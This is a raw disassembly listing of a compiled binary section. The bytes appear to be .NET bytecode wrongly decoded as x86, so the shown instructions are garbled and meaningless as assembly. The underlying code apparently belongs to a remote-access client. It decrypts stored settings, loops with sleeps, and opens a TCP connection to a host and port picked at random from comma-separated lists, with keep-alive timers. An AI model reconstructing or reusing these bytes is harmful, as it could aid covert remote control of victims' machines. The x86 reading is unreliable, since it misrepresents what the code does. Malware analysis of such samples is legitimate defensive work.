  4025cc:	00 00                	add    %al,(%eax)
  4025ce:	0a 80 3b 00 00 04    	or     0x400003b(%eax),%al
  4025d4:	2a 5e 02             	sub    0x2(%esi),%bl
  4025d7:	28 1b                	sub    %bl,(%ebx)
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	0a 03                	or     (%ebx),%al
  4025dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4025de:	21 00                	and    %eax,(%eax)
  4025e0:	00 0a                	add    %cl,(%edx)
  4025e2:	28 99 00 00 06 28    	sub    %bl,0x28060000(%ecx)
  4025e8:	fb                   	sti
  4025e9:	00 00                	add    %al,(%eax)
  4025eb:	0a 2a                	or     (%edx),%ch
  4025ed:	5e                   	pop    %esi
  4025ee:	28 1b                	sub    %bl,(%ebx)
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	0a 02                	or     (%edx),%al
  4025f4:	03 28                	add    (%eax),%ebp
  4025f6:	1c 00                	sbb    $0x0,%al
  4025f8:	00 0a                	add    %cl,(%edx)
  4025fa:	28 9b 00 00 06 6f    	sub    %bl,0x6f060000(%ebx)
  402600:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402605:	62 1f                	bound  %ebx,(%edi)
  402607:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40260d:	25 d0 44 00 00       	and    $0x44d0,%eax
  402612:	04 28                	add    $0x28,%al
  402614:	78 00                	js     0x402616
  402616:	00 0a                	add    %cl,(%edx)
  402618:	80 43 00 00          	addb   $0x0,0x0(%ebx)
  40261c:	04 2a                	add    $0x2a,%al
  40261e:	00 00                	add    %al,(%eax)
  402620:	1b 30                	sbb    (%eax),%esi
  402622:	03 00                	add    (%eax),%eax
  402624:	b5 00                	mov    $0x0,%ch
  402626:	00 00                	add    %al,(%eax)
  402628:	01 00                	add    %eax,(%eax)
  40262a:	00 11                	add    %dl,(%ecx)
  40262c:	16                   	push   %ss
  40262d:	0a 2b                	or     (%ebx),%ch
  40262f:	0e                   	push   %cs
  402630:	20 e8                	and    %ch,%al
  402632:	03 00                	add    (%eax),%eax
  402634:	00 28                	add    %ch,(%eax)
  402636:	14 00                	adc    $0x0,%al
  402638:	00 0a                	add    %cl,(%edx)
  40263a:	06                   	push   %es
  40263b:	17                   	pop    %ss
  40263c:	58                   	pop    %eax
  40263d:	0a 06                	or     (%esi),%al
  40263f:	7e 11                	jle    0x402652
  402641:	00 00                	add    %al,(%eax)
  402643:	04 28                	add    $0x28,%al
  402645:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  40264a:	e5 28                	in     $0x28,%eax
  40264c:	03 00                	add    (%eax),%eax
  40264e:	00 06                	add    %al,(%esi)
  402650:	2d 06 16 28 16       	sub    $0x16281606,%eax
  402655:	00 00                	add    %al,(%eax)
  402657:	0a 00                	or     (%eax),%al
  402659:	28 87 00 00 06 2d    	sub    %al,0x2d060000(%edi)
  40265f:	06                   	push   %es
  402660:	16                   	push   %ss
  402661:	28 16                	sub    %dl,(%esi)
  402663:	00 00                	add    %al,(%eax)
  402665:	0a 7e 0c             	or     0xc(%esi),%bh
  402668:	00 00                	add    %al,(%eax)
  40266a:	04 28                	add    $0x28,%al
  40266c:	17                   	pop    %ss
  40266d:	00 00                	add    %al,(%eax)
  40266f:	0a 2c 05 28 72 00 00 	or     0x7228(,%eax,1),%ch
  402676:	06                   	push   %es
  402677:	7e 04                	jle    0x40267d
  402679:	00 00                	add    %al,(%eax)
  40267b:	04 28                	add    $0x28,%al
  40267d:	17                   	pop    %ss
  40267e:	00 00                	add    %al,(%eax)
  402680:	0a 2c 05 28 70 00 00 	or     0x7028(,%eax,1),%ch
  402687:	06                   	push   %es
  402688:	7e 0f                	jle    0x402699
  40268a:	00 00                	add    %al,(%eax)
  40268c:	04 28                	add    $0x28,%al
  40268e:	17                   	pop    %ss
  40268f:	00 00                	add    %al,(%eax)
  402691:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402694:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  40269a:	05 28 8a 00 00       	add    $0x8a28,%eax
  40269f:	06                   	push   %es
  4026a0:	28 86 00 00 06 73    	sub    %al,0x73060000(%esi)
  4026a6:	7d 00                	jge    0x4026a8
  4026a8:	00 06                	add    %al,(%esi)
  4026aa:	28 7b 00             	sub    %bh,0x0(%ebx)
  4026ad:	00 06                	add    %al,(%esi)
  4026af:	26 de 03             	fiadds %es:(%ebx)
  4026b2:	26 de 00             	fiadds %es:(%eax)
  4026b5:	28 12                	sub    %dl,(%edx)
  4026b7:	00 00                	add    %al,(%eax)
  4026b9:	06                   	push   %es
  4026ba:	2d 0a 28 1c 00       	sub    $0x1c280a,%eax
  4026bf:	00 06                	add    %al,(%esi)
  4026c1:	28 19                	sub    %bl,(%ecx)
  4026c3:	00 00                	add    %al,(%eax)
  4026c5:	06                   	push   %es
  4026c6:	73 18                	jae    0x4026e0
  4026c8:	00 00                	add    %al,(%eax)
  4026ca:	0a 20                	or     (%eax),%ah
  4026cc:	e8 03 00 00 20       	call   0x204026d4
  4026d1:	88 13                	mov    %dl,(%ebx)
  4026d3:	00 00                	add    %al,(%eax)
  4026d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d6:	19 00                	sbb    %eax,(%eax)
  4026d8:	00 0a                	add    %cl,(%edx)
  4026da:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026dd:	00 0a                	add    %cl,(%edx)
  4026df:	2b d4                	sub    %esp,%edx
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	00 01                	add    %al,(%ecx)
  4026e5:	10 00                	adc    %al,(%eax)
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	00 2d 00 59 86 00    	add    %ch,0x865900
  4026ef:	03 01                	add    (%ecx),%eax
  4026f1:	00 00                	add    %al,(%eax)
  4026f3:	01 1b                	add    %ebx,(%ebx)
  4026f5:	30 02                	xor    %al,(%edx)
  4026f7:	00 13                	add    %dl,(%ebx)
  4026f9:	01 00                	add    %eax,(%eax)
  4026fb:	00 02                	add    %al,(%edx)
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	11 28                	adc    %ebp,(%eax)
  402701:	1b 00                	sbb    (%eax),%eax
  402703:	00 0a                	add    %cl,(%edx)
  402705:	7e 07                	jle    0x40270e
  402707:	00 00                	add    %al,(%eax)
  402709:	04 28                	add    $0x28,%al
  40270b:	1c 00                	sbb    $0x0,%al
  40270d:	00 0a                	add    %cl,(%edx)
  40270f:	6f                   	outsl  %ds:(%esi),(%dx)
  402710:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  402715:	07                   	pop    %es
  402716:	00 00                	add    %al,(%eax)
  402718:	04 7e                	add    $0x7e,%al
  40271a:	07                   	pop    %es
  40271b:	00 00                	add    %al,(%eax)
  40271d:	04 73                	add    $0x73,%al
  40271f:	97                   	xchg   %eax,%edi
  402720:	00 00                	add    %al,(%eax)
  402722:	06                   	push   %es
  402723:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272a:	00 00                	add    %al,(%eax)
  40272c:	04 7e                	add    $0x7e,%al
  40272e:	01 00                	add    %eax,(%eax)
  402730:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402733:	9a 00 00 06 80 01 00 	lcall  $0x1,$0x80060000
  40273a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40273d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402742:	02 00                	add    (%eax),%al
  402744:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402747:	9a 00 00 06 80 02 00 	lcall  $0x2,$0x80060000
  40274e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402751:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402756:	03 00                	add    (%eax),%eax
  402758:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275b:	9a 00 00 06 80 03 00 	lcall  $0x3,$0x80060000
  402762:	00 04 7e             	add    %al,(%esi,%edi,2)
  402765:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276a:	04 00                	add    $0x0,%al
  40276c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40276f:	9a 00 00 06 80 04 00 	lcall  $0x4,$0x80060000
  402776:	00 04 7e             	add    %al,(%esi,%edi,2)
  402779:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40277e:	08 00                	or     %al,(%eax)
  402780:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402783:	9a 00 00 06 80 08 00 	lcall  $0x8,$0x80060000
  40278a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40278d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402792:	0e                   	push   %cs
  402793:	00 00                	add    %al,(%eax)
  402795:	04 6f                	add    $0x6f,%al
  402797:	9a 00 00 06 80 0e 00 	lcall  $0xe,$0x80060000
  40279e:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a1:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027a6:	0c 00                	or     $0x0,%al
  4027a8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027ab:	9a 00 00 06 80 0c 00 	lcall  $0xc,$0x80060000
  4027b2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027b5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027ba:	0f 00 00             	sldt   (%eax)
  4027bd:	04 6f                	add    $0x6f,%al
  4027bf:	9a 00 00 06 80 0f 00 	lcall  $0xf,$0x80060000
  4027c6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027c9:	7e 00                	jle    0x4027cb
  4027cb:	00 06                	add    %al,(%esi)
  4027cd:	80 10 00             	adcb   $0x0,(%eax)
  4027d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027d3:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d8:	0a 00                	or     (%eax),%al
  4027da:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027dd:	9a 00 00 06 80 0a 00 	lcall  $0xa,$0x80060000
  4027e4:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027e7:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027ec:	09 00                	or     %eax,(%eax)
  4027ee:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f1:	9a 00 00 06 28 1c 00 	lcall  $0x1c,$0x28060000
  4027f8:	00 0a                	add    %cl,(%edx)
  4027fa:	73 1e                	jae    0x40281a
  4027fc:	00 00                	add    %al,(%eax)
  4027fe:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  402804:	28 04 00             	sub    %al,(%eax,%eax,1)
  402807:	00 06                	add    %al,(%esi)
  402809:	0a de                	or     %dh,%bl
  40280b:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402810:	00 06                	add    %al,(%esi)
  402812:	2a 00                	sub    (%eax),%al
  402814:	41                   	inc    %ecx
  402815:	1c 00                	sbb    $0x0,%al
	...
  40281f:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  402822:	00 00                	add    %al,(%eax)
  402824:	0c 01                	or     $0x1,%al
  402826:	00 00                	add    %al,(%eax)
  402828:	05 00 00 00 01       	add    $0x1000000,%eax
  40282d:	00 00                	add    %al,(%eax)
  40282f:	01 1b                	add    %ebx,(%ebx)
  402831:	30 04 00             	xor    %al,(%eax,%eax,1)
  402834:	4b                   	dec    %ebx
  402835:	00 00                	add    %al,(%eax)
  402837:	00 02                	add    %al,(%edx)
  402839:	00 00                	add    %al,(%eax)
  40283b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40283e:	00 00                	add    %al,(%eax)
  402840:	04 6f                	add    $0x6f,%al
  402842:	1f                   	pop    %ds
  402843:	00 00                	add    %al,(%eax)
  402845:	0a 6f 20             	or     0x20(%edi),%ch
  402848:	00 00                	add    %al,(%eax)
  40284a:	0a 74 30 00          	or     0x0(%eax,%esi,1),%dh
  40284e:	00 01                	add    %al,(%ecx)
  402850:	28 1b                	sub    %bl,(%ebx)
  402852:	00 00                	add    %al,(%eax)
  402854:	0a 7e 07             	or     0x7(%esi),%bh
  402857:	00 00                	add    %al,(%eax)
  402859:	04 6f                	add    $0x6f,%al
  40285b:	21 00                	and    %eax,(%eax)
  40285d:	00 0a                	add    %cl,(%edx)
  40285f:	28 9f 00 00 06 72    	sub    %bl,0x72060000(%edi)
  402865:	01 00                	add    %eax,(%eax)
  402867:	00 70 28             	add    %dh,0x28(%eax)
  40286a:	22 00                	and    (%eax),%al
  40286c:	00 0a                	add    %cl,(%edx)
  40286e:	7e 0a                	jle    0x40287a
  402870:	00 00                	add    %al,(%eax)
  402872:	04 28                	add    $0x28,%al
  402874:	1c 00                	sbb    $0x0,%al
  402876:	00 0a                	add    %cl,(%edx)
  402878:	6f                   	outsl  %ds:(%esi),(%dx)
  402879:	23 00                	and    (%eax),%eax
  40287b:	00 0a                	add    %cl,(%edx)
  40287d:	0a de                	or     %dh,%bl
  40287f:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402884:	00 06                	add    %al,(%esi)
  402886:	2a 00                	sub    (%eax),%al
  402888:	01 10                	add    %edx,(%eax)
  40288a:	00 00                	add    %al,(%eax)
  40288c:	00 00                	add    %al,(%eax)
  40288e:	00 00                	add    %al,(%eax)
  402890:	44                   	inc    %esp
  402891:	44                   	inc    %esp
  402892:	00 05 32 00 00 01    	add    %al,0x1000032
  402898:	13 30                	adc    (%eax),%esi
  40289a:	01 00                	add    %eax,(%eax)
  40289c:	97                   	xchg   %eax,%edi
  40289d:	00 00                	add    %al,(%eax)
  40289f:	00 00                	add    %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	00 72 0f             	add    %dh,0xf(%edx)
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	70 80                	jo     0x40282a
  4028aa:	01 00                	add    %eax,(%eax)
  4028ac:	00 04 72             	add    %al,(%edx,%esi,2)
  4028af:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028b6:	00 04 72             	add    %al,(%edx,%esi,2)
  4028b9:	9d                   	popf
  4028ba:	01 00                	add    %eax,(%eax)
  4028bc:	70 80                	jo     0x40283e
  4028be:	03 00                	add    (%eax),%eax
  4028c0:	00 04 72             	add    %al,(%edx,%esi,2)
  4028c3:	50                   	push   %eax
  4028c4:	02 00                	add    (%eax),%al
  4028c6:	70 80                	jo     0x402848
  4028c8:	04 00                	add    $0x0,%al
  4028ca:	00 04 72             	add    %al,(%edx,%esi,2)
  4028cd:	03 03                	add    (%ebx),%eax
  4028cf:	00 70 80             	add    %dh,-0x80(%eax)
  4028d2:	05 00 00 04 72       	add    $0x72040000,%eax
  4028d7:	17                   	pop    %ss
  4028d8:	03 00                	add    (%eax),%eax
  4028da:	70 80                	jo     0x40285c
  4028dc:	06                   	push   %es
  4028dd:	00 00                	add    %al,(%eax)
  4028df:	04 72                	add    $0x72,%al
  4028e1:	39 03                	cmp    %eax,(%ebx)
  4028e3:	00 70 80             	add    %dh,-0x80(%eax)
  4028e6:	07                   	pop    %es
  4028e7:	00 00                	add    %al,(%eax)
  4028e9:	04 72                	add    $0x72,%al
  4028eb:	93                   	xchg   %eax,%ebx
  4028ec:	03 00                	add    (%eax),%eax
  4028ee:	70 80                	jo     0x402870
  4028f0:	08 00                	or     %al,(%eax)
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	46                   	inc    %esi
  4028f6:	04 00                	add    $0x0,%al
  4028f8:	70 80                	jo     0x40287a
  4028fa:	09 00                	or     %eax,(%eax)
  4028fc:	00 04 72             	add    %al,(%edx,%esi,2)
  4028ff:	a1 16 00 70 80       	mov    0x80700016,%eax
  402904:	0a 00                	or     (%eax),%al
  402906:	00 04 72             	add    %al,(%edx,%esi,2)
  402909:	54                   	push   %esp
  40290a:	1e                   	push   %ds
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	0c 00                	or     $0x0,%al
  402910:	00 04 72             	add    %al,(%edx,%esi,2)
  402913:	07                   	pop    %es
  402914:	1f                   	pop    %ds
  402915:	00 70 80             	add    %dh,-0x80(%eax)
  402918:	0e                   	push   %cs
  402919:	00 00                	add    %al,(%eax)
  40291b:	04 72                	add    $0x72,%al
  40291d:	ba 1f 00 70 80       	mov    $0x8070001f,%edx
  402922:	0f 00 00             	sldt   (%eax)
  402925:	04 72                	add    $0x72,%al
  402927:	6d                   	insl   (%dx),%es:(%edi)
  402928:	20 00                	and    %al,(%eax)
  40292a:	70 80                	jo     0x4028ac
  40292c:	10 00                	adc    %al,(%eax)
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	6f                   	outsl  %ds:(%esi),(%dx)
  402932:	20 00                	and    %al,(%eax)
  402934:	70 80                	jo     0x4028b6
  402936:	11 00                	adc    %eax,(%eax)
  402938:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40293b:	00 1b                	add    %bl,(%ebx)
  40293d:	30 07                	xor    %al,(%edi)
  40293f:	00 9e 02 00 00 03    	add    %bl,0x3000002(%esi)
  402945:	00 00                	add    %al,(%eax)
  402947:	11 18                	adc    %ebx,(%eax)
  402949:	17                   	pop    %ss
  40294a:	1c 73                	sbb    $0x73,%al
  40294c:	24 00                	and    $0x0,%al
  40294e:	00 0a                	add    %cl,(%edx)
  402950:	25 20 00 c8 00       	and    $0xc80020,%eax
  402955:	00 6f 25             	add    %ch,0x25(%edi)
  402958:	00 00                	add    %al,(%eax)
  40295a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402960:	00 6f 26             	add    %ch,0x26(%edi)
  402963:	00 00                	add    %al,(%eax)
  402965:	0a 28                	or     (%eax),%ch
  402967:	07                   	pop    %es
  402968:	00 00                	add    %al,(%eax)
  40296a:	06                   	push   %es
  40296b:	7e 0e                	jle    0x40297b
  40296d:	00 00                	add    %al,(%eax)
  40296f:	04 72                	add    $0x72,%al
  402971:	73 20                	jae    0x402993
  402973:	00 70 28             	add    %dh,0x28(%eax)
  402976:	27                   	daa
  402977:	00 00                	add    %al,(%eax)
  402979:	0a 39                	or     (%ecx),%bh
  40297b:	d0 00                	rolb   $1,(%eax)
  40297d:	00 00                	add    %al,(%eax)
  40297f:	7e 02                	jle    0x402983
  402981:	00 00                	add    %al,(%eax)
  402983:	04 17                	add    $0x17,%al
  402985:	8d 3a                	lea    (%edx),%edi
  402987:	00 00                	add    %al,(%eax)
  402989:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  40298f:	6f                   	outsl  %ds:(%esi),(%dx)
  402990:	28 00                	sub    %al,(%eax)
  402992:	00 0a                	add    %cl,(%edx)
  402994:	73 18                	jae    0x4029ae
  402996:	00 00                	add    %al,(%eax)
  402998:	0a 7e 02             	or     0x2(%esi),%bh
  40299b:	00 00                	add    %al,(%eax)
  40299d:	04 17                	add    $0x17,%al
  40299f:	8d 3a                	lea    (%edx),%edi
  4029a1:	00 00                	add    %al,(%eax)
  4029a3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029aa:	28 00                	sub    %al,(%eax)
  4029ac:	00 0a                	add    %cl,(%edx)
  4029ae:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4029b1:	29 00                	sub    %eax,(%eax)
  4029b3:	00 0a                	add    %cl,(%edx)
  4029b5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029bc:	17                   	pop    %ss
  4029bd:	8d 3a                	lea    (%edx),%edi
  4029bf:	00 00                	add    %al,(%eax)
  4029c1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c8:	28 00                	sub    %al,(%eax)
  4029ca:	00 0a                	add    %cl,(%edx)
  4029cc:	73 18                	jae    0x4029e6
  4029ce:	00 00                	add    %al,(%eax)
  4029d0:	0a 7e 01             	or     0x1(%esi),%bh
  4029d3:	00 00                	add    %al,(%eax)
  4029d5:	04 17                	add    $0x17,%al
  4029d7:	8d 3a                	lea    (%edx),%edi
  4029d9:	00 00                	add    %al,(%eax)
  4029db:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e2:	28 00                	sub    %al,(%eax)
  4029e4:	00 0a                	add    %cl,(%edx)
  4029e6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4029e9:	29 00                	sub    %eax,(%eax)
  4029eb:	00 0a                	add    %cl,(%edx)
  4029ed:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  4029f4:	06                   	push   %es
  4029f5:	28 1a                	sub    %bl,(%edx)
  4029f7:	00 00                	add    %al,(%eax)
  4029f9:	06                   	push   %es
  4029fa:	2c 42                	sub    $0x42,%al
  4029fc:	06                   	push   %es
  4029fd:	28 2a                	sub    %ch,(%edx)
  4029ff:	00 00                	add    %al,(%eax)
  402a01:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a04:	0d 2b 2c 08 09       	or     $0x9082c2b,%eax
  402a09:	9a 13 04 28 06 00 00 	lcall  $0x0,$0x6280413
  402a10:	06                   	push   %es
  402a11:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a14:	6f                   	outsl  %ds:(%esi),(%dx)
  402a15:	2b 00                	sub    (%eax),%eax
  402a17:	00 0a                	add    %cl,(%edx)
  402a19:	28 06                	sub    %al,(%esi)
  402a1b:	00 00                	add    %al,(%eax)
  402a1d:	06                   	push   %es
  402a1e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a1f:	2c 00                	sub    $0x0,%al
  402a21:	00 0a                	add    %cl,(%edx)
  402a23:	2c 05                	sub    $0x5,%al
  402a25:	dd af 00 00 00 de    	(bad) -0x22000000(%edi)
  402a2b:	03 26                	add    (%esi),%esp
  402a2d:	de 00                	fiadds (%eax)
  402a2f:	09 17                	or     %edx,(%edi)
  402a31:	58                   	pop    %eax
  402a32:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a37:	32 ce                	xor    %dh,%cl
  402a39:	38 9b 00 00 00 28    	cmp    %bl,0x28000000(%ebx)
  402a3f:	06                   	push   %es
  402a40:	00 00                	add    %al,(%eax)
  402a42:	06                   	push   %es
  402a43:	06                   	push   %es
  402a44:	07                   	pop    %es
  402a45:	6f                   	outsl  %ds:(%esi),(%dx)
  402a46:	2d 00 00 0a 38       	sub    $0x380a0000,%eax
  402a4b:	8a 00                	mov    (%eax),%al
  402a4d:	00 00                	add    %al,(%eax)
  402a4f:	73 2e                	jae    0x402a7f
  402a51:	00 00                	add    %al,(%eax)
  402a53:	0a 13                	or     (%ebx),%dl
  402a55:	05 72 6d 20 00       	add    $0x206d72,%eax
  402a5a:	70 72                	jo     0x402ace
  402a5c:	6d                   	insl   (%dx),%es:(%edi)
  402a5d:	20 00                	and    %al,(%eax)
  402a5f:	70 73                	jo     0x402ad4
  402a61:	2f                   	das
  402a62:	00 00                	add    %al,(%eax)
  402a64:	0a 13                	or     (%ebx),%dl
  402a66:	06                   	push   %es
  402a67:	11 05 11 06 6f 30    	adc    %eax,0x306f0611
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	0a 11                	or     (%ecx),%dl
  402a71:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402a76:	04 6f                	add    $0x6f,%al
  402a78:	31 00                	xor    %eax,(%eax)
  402a7a:	00 0a                	add    %cl,(%edx)
  402a7c:	17                   	pop    %ss
  402a7d:	8d 39                	lea    (%ecx),%edi
  402a7f:	00 00                	add    %al,(%eax)
  402a81:	01 25 16 72 7d 20    	add    %esp,0x207d7216
  402a87:	00 70 a2             	add    %dh,-0x5e(%eax)
  402a8a:	16                   	push   %ss
  402a8b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a8c:	32 00                	xor    (%eax),%al
  402a8e:	00 0a                	add    %cl,(%edx)
  402a90:	13 07                	adc    (%edi),%eax
  402a92:	11 07                	adc    %eax,(%edi)
  402a94:	16                   	push   %ss
  402a95:	9a 80 02 00 00 04 11 	lcall  $0x1104,$0x280
  402a9c:	07                   	pop    %es
  402a9d:	73 18                	jae    0x402ab7
  402a9f:	00 00                	add    %al,(%eax)
  402aa1:	0a 17                	or     (%edi),%dl
  402aa3:	11 07                	adc    %eax,(%edi)
  402aa5:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aa8:	19 00                	sbb    %eax,(%eax)
  402aaa:	00 0a                	add    %cl,(%edx)
  402aac:	9a 80 01 00 00 04 28 	lcall  $0x2804,$0x180
  402ab3:	06                   	push   %es
  402ab4:	00 00                	add    %al,(%eax)
  402ab6:	06                   	push   %es
  402ab7:	7e 02                	jle    0x402abb
  402ab9:	00 00                	add    %al,(%eax)
  402abb:	04 7e                	add    $0x7e,%al
  402abd:	01 00                	add    %eax,(%eax)
  402abf:	00 04 28             	add    %al,(%eax,%ebp,1)
  402ac2:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402ac7:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402acc:	0c 11                	or     $0x11,%al
  402ace:	05 2c 07 11 05       	add    $0x511072c,%eax
  402ad3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ad4:	33 00                	xor    (%eax),%eax
  402ad6:	00 0a                	add    %cl,(%edx)
  402ad8:	dc 28                	fsubrl (%eax)
  402ada:	06                   	push   %es
  402adb:	00 00                	add    %al,(%eax)
  402add:	06                   	push   %es
  402ade:	6f                   	outsl  %ds:(%esi),(%dx)
  402adf:	2c 00                	sub    $0x0,%al
  402ae1:	00 0a                	add    %cl,(%edx)
  402ae3:	39 ec                	cmp    %ebp,%esp
  402ae5:	00 00                	add    %al,(%eax)
  402ae7:	00 17                	add    %dl,(%edi)
  402ae9:	28 13                	sub    %dl,(%ebx)
  402aeb:	00 00                	add    %al,(%eax)
  402aed:	06                   	push   %es
  402aee:	28 06                	sub    %al,(%esi)
  402af0:	00 00                	add    %al,(%eax)
  402af2:	06                   	push   %es
  402af3:	17                   	pop    %ss
  402af4:	73 34                	jae    0x402b2a
  402af6:	00 00                	add    %al,(%eax)
  402af8:	0a 16                	or     (%esi),%dl
  402afa:	14 fe                	adc    $0xfe,%al
  402afc:	06                   	push   %es
  402afd:	1b 00                	sbb    (%eax),%eax
  402aff:	00 06                	add    %al,(%esi)
  402b01:	73 35                	jae    0x402b38
  402b03:	00 00                	add    %al,(%eax)
  402b05:	0a 73 36             	or     0x36(%ebx),%dh
  402b08:	00 00                	add    %al,(%eax)
  402b0a:	0a 28                	or     (%eax),%ch
  402b0c:	09 00                	or     %eax,(%eax)
  402b0e:	00 06                	add    %al,(%esi)
  402b10:	28 08                	sub    %cl,(%eax)
  402b12:	00 00                	add    %al,(%eax)
  402b14:	06                   	push   %es
  402b15:	28 06                	sub    %al,(%esi)
  402b17:	00 00                	add    %al,(%eax)
  402b19:	06                   	push   %es
  402b1a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1b:	37                   	aaa
  402b1c:	00 00                	add    %al,(%eax)
  402b1e:	0a 6f 38             	or     0x38(%edi),%ch
  402b21:	00 00                	add    %al,(%eax)
  402b23:	0a 17                	or     (%edi),%dl
  402b25:	8d 3a                	lea    (%edx),%edi
  402b27:	00 00                	add    %al,(%eax)
  402b29:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	28 00                	sub    %al,(%eax)
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	16                   	push   %ss
  402b35:	9a 14 20 c0 00 00 00 	lcall  $0x0,$0xc02014
  402b3c:	16                   	push   %ss
  402b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3e:	39 00                	cmp    %eax,(%eax)
  402b40:	00 0a                	add    %cl,(%edx)
  402b42:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b45:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b4a:	0c 00                	or     $0x0,%al
  402b4c:	00 06                	add    %al,(%esi)
  402b4e:	d4 8d                	aam    $0x8d
  402b50:	44                   	inc    %esp
  402b51:	00 00                	add    %al,(%eax)
  402b53:	01 28                	add    %ebp,(%eax)
  402b55:	0b 00                	or     (%eax),%eax
  402b57:	00 06                	add    %al,(%esi)
  402b59:	16                   	push   %ss
  402b5a:	6a 28                	push   $0x28
  402b5c:	0f 00 00             	sldt   (%eax)
  402b5f:	06                   	push   %es
  402b60:	28 80 00 00 06 28    	sub    %al,0x28060000(%eax)
  402b66:	1e                   	push   %ds
  402b67:	00 00                	add    %al,(%eax)
  402b69:	06                   	push   %es
  402b6a:	14 fe                	adc    $0xfe,%al
  402b6c:	06                   	push   %es
  402b6d:	1f                   	pop    %ds
  402b6e:	00 00                	add    %al,(%eax)
  402b70:	06                   	push   %es
  402b71:	73 3a                	jae    0x402bad
  402b73:	00 00                	add    %al,(%eax)
  402b75:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402b78:	18 00                	sbb    %al,(%eax)
  402b7a:	00 0a                	add    %cl,(%edx)
  402b7c:	20 98 3a 00 00 20    	and    %bl,0x2000003a(%eax)
  402b82:	30 75 00             	xor    %dh,0x0(%ebp)
  402b85:	00 6f 19             	add    %ch,0x19(%edi)
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	0a 73 18             	or     0x18(%ebx),%dh
  402b8d:	00 00                	add    %al,(%eax)
  402b8f:	0a 20                	or     (%eax),%ah
  402b91:	98                   	cwtl
  402b92:	3a 00                	cmp    (%eax),%al
  402b94:	00 20                	add    %ah,(%eax)
  402b96:	60                   	pusha
  402b97:	ea 00 00 6f 19 00 00 	ljmp   $0x0,$0x196f0000
  402b9e:	0a 73 3b             	or     0x3b(%ebx),%dh
  402ba1:	00 00                	add    %al,(%eax)
